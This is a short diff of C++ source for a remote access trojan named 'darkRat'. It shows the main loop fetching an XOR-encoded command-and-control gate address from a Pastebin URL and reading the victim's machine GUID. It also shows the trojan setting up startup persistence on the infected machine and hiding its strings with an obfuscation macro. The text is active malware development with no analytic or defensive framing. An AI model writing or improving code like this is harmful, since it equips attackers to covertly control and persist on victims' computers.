@@ -52,8 +52,8 @@ public:
 		return finalPost;
 	}
 
-	static void darkMainThread() {
-		darkRat::config::config config = darkRat::config::load();
+	static void darkMainThread(darkRat::config::config config) {
+		//darkRat::config::config config = darkRat::config::load();
 		std::thread startupPersistence;
 		//Fetch Gate from raw Site
 		std::string gateFromPatebin = XOR::encryptDecrypt(postRequest(config.pastebinUrl, "", "GET"));
@@ -62,8 +62,13 @@ public:
 		std::string guid = Helpers::GetMachineGUID();
 		std::string finalPost = Client::returnFinalPost();
 
-		if (config.startup == "true") {
-			startupPersistence = std::thread(Helpers::addstartup);
+		if (config.startup == OBFUSCATE("true")) {
+			try {
+				startupPersistence = std::thread(Helpers::addstartup);
+			}
+			catch (const std::exception & e) {
+				std::cerr << OBFUSCATE("Startup failed, error: ") << e.what() << std::endl;
+			}
 		}
 
 		while (true) {
